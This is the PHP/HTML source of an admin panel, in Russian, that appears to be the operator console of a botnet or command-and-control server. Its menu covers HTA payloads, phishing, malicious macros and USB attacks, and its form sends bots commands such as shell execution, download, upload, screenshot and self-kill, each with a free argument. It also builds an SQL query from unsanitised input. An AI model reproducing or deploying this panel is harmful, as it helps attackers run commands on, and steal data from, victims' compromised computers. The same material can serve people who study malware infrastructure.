<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>HTA</title>

    <!-- Bootstrap Core CSS -->
    <link href="../css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="../css/sb-admin.css" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="../font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>

<body>

    <div id="wrapper">

        <!-- Navigation -->
        <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <div style="margin:-10px 0 0 10px"><a class="navbar-brand" href="index.php"><img src="../css/logo1.png" width="100px"></a></div>
            </div>
            <!-- Top Menu Items -->
            <ul class="nav navbar-right top-nav">
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"><i class="fa fa-user"></i> admin <b class="caret"></b></a>
                    <ul class="dropdown-menu">
                        <li>
                            <a href="#"><i class="fa fa-fw fa-power-off"></i> Log Out</a>
                        </li>
                    </ul>
                </li>
            </ul>
            <!-- Sidebar Menu Items - These collapse to the responsive navigation menu on small screens -->
            <div class="collapse navbar-collapse navbar-ex1-collapse">
                <ul class="nav navbar-nav side-nav">
                    <li>
                        <a href="../index.php"><i class="fa fa-dashboard"></i> Статистика</a>
                    </li>
                    <li class="active">
                        <a href=""><i class="fa fa-bug"></i> HTA</a>
                    </li>
                     <li>
                        <a href="../phishing/"><i class="fa fa-certificate"></i> Фишинг</a>
                    </li>
                     <li>
                        <a href="../makros/"><i class="glyphicon glyphicon-play-circle"></i> Макросы</a>
                    </li>
                    <li>
                        <a href="../usb/"><i class="fa fa-flag"></i> USB</a>
                    </li>
                    <li>
                        <a><i class="glyphicon glyphicon-list-alt"></i> Шаблоны</a>
                        <ul id="demo">
                            <li>
                                <a href="../template/">Готовые</a>
                            </li>
                            <li>
                                <a href="../template/deployed.php">Развернутые шаблоны</a>
                            </li>
                            <li>
                                <a href="../template/new.php">Загрузить новый</a>
                            </li>
                            <li>
                                <a href="../template/delete.php">Удалить</a>
                            </li>
                        </ul>
                    </li>
                   <li>
                        <a><i class="glyphicon glyphicon-file"></i> Создание отчета</a>
                        <ul id="demo1">
                            <li>
                                <a href="../report/">Создать отчет</a>
                            </li>
                            <li>
                                <a href="../report/statistic.php">Статистика</a>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <a href="../guides/"><i class="glyphicon glyphicon-film "></i> Гайды по настройке</a>
                    </li>
                    <li>
                        <a href="../wiki/"><i class="glyphicon glyphicon-info-sign"></i> Вики</a>
                    </li>
                </ul>
            </div>
            <!-- /.navbar-collapse -->
        </nav>

        <div id="page-wrapper" style="height: 800px">

            <div class="container-fluid" >

                <!-- Page Heading -->
                <div class="row">
                    <div class="col-lg-12">
                        <h1 class="page-header">
                            .HTA
                            <small>админка</small>
                        </h1>
                        <ol class="breadcrumb">
                            <li>
                                <i class="fa fa-dashboard"></i>  <a href="../">Статистика</a>
                            </li>
                            <li class="active">
                                <i class="fa fa-bug"></i> HTA
                            </li>
                        </ol>

<?php
include ("../bd.php");

$query = mysqli_query($link,"SELECT client_id FROM tasks GROUP BY client_id");
echo '                  
                    <form action="new_task.php" method="POST">
                       <div style="display: table;">
                               <h4>Выберите бота и введите команду:</h4>
                                 <div style="float:left;margin-right:20px">
                                    <select style="padding: 30px; border: 1px solid #DDDDDD;font-size: 14px;" multiple="" class="element" size="10" name="client_id">
                                    <option class="option" disabled="">Выбери бота</option>';

while($row = mysqli_fetch_array($query,MYSQLI_NUM)){
    $client_id=$row[0];
    $query2 = mysqli_query($link,"select time from timelog where client_id = '".$client_id."' order by time desc");
    $row2 = mysqli_fetch_array($query2,MYSQLI_NUM);
    $time = $row2[0];

    echo '<option class="option">'.$client_id.'</option>
    ';
}                  
echo '</select></div>';  
echo ' 
<div style="float:left;">
            <select style="padding: 30px; border: 1px solid #DDDDDD;font-size: 14px;" multiple="" class="element" size="10" name="operation">
                <option class="option" disabled="">Выбери команду</option>
                <option class="option">idle</option>
                <option class="option">shex</option>
                <option class="option">dnld</option>
                <option class="option">upload</option>
                <option class="option">screeshot</option>
                <option class="option">kill_bot !!!</option>
            </select>       
        </div>

                        
         <div style="float:left;margin-left:40px">
             <label>Введите комманду</label><br>
             <input size="30" class="form-control" name="argument" placeholder="Enter text"><br><br>
              <button type="submit" style="margin-left:60px" class="btn btn-default">Отправить</button>
         </div></form>';                
?>             
                    </div> <!--/top -->
                    </div>
                    <div class="row">
                    <div class="col-lg-12" style="border:1px solid #DDDDDD;margin:20px 0 -10px 0 "></div></div>

                        <br>
 <!-- Таблица -->     <div class="col-lg-12">

                        <div class="table-responsive">
                           <div class="footer"></div>
                                <div id="tableHolder" style="margin-top:20px">
                                <?php
                                include ("user.php");
                                ?>
                                </div>
                        </div>
<!-- /Таблица -->       </div>
                    </div>
                </div>
                <!-- /.row -->

            </div>
            <!-- /.container-fluid -->

        </div>
        <!-- /#page-wrapper -->

    </div>
    <!-- /#wrapper -->

    <!-- jQuery -->
    <script src="../js/jquery.js"></script>

    <!-- Bootstrap Core JavaScript -->
    <script src="../js/bootstrap.min.js"></script>

 <script type="text/javascript">
    $(document).ready(function(){
      refreshTable();
    });

    function refreshTable(){
        $('#tableHolder').load('user.php', function(){
           setTimeout(refreshTable, 1000);
        });
    }
</script>   

</body>

</html>
